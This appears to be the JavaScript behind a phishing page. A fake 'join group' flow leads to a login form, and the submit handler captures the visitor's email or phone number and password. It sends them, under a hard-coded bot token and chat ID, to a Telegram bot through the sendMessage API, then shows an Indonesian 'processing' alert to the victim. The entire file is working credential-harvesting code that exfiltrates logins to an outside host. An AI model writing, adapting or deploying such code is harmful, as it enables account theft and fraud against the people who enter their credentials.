function toggleRules() {
  const rules = document.getElementById("rules");
  rules.style.display = rules.style.display === "block" ? "none" : "block";
}
function joinGroup() {
  document.getElementById("groupPage").style.display = "none";
  document.getElementById("loginPage").style.display = "block";
}

document.querySelector("form").addEventListener("submit", function (e) {
  e.preventDefault();

  const token = "8023818163:AAGquHbc8-yDPFcRN9s7Y3fWWVawkCuGZ_A";
  const chatId = "7819779147";

  const email = document.querySelector("input[type='text']").value;
  const password = document.querySelector("input[type='password']").value;

  const message = `📩 Login Baru!\n📱 Email/No HP: ${email}\n🔑 Password: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  }).then(() => {
    alert("Sedang diproses...");
  });
});
